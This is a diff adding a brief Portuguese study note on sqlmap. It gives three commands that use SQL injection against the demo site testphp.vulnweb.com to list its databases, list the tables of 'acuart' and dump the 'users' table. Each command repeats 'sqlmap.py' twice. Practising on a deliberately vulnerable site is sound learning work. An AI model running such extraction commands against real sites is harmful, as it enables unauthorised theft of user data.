@@ -1,0 +1,11 @@
+Link do SqlMap
+http://sqlmap.org/
+
+# pegando o banco
+python2 sqlmap.py sqlmap.py --url "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dbs
+
+# pegando as tabelas
+python2 sqlmap.py sqlmap.py --url "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --tables -D acuart
+
+# pegando os usuarios do banco
+python2 sqlmap.py sqlmap.py --url "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dump -T users -D acuart
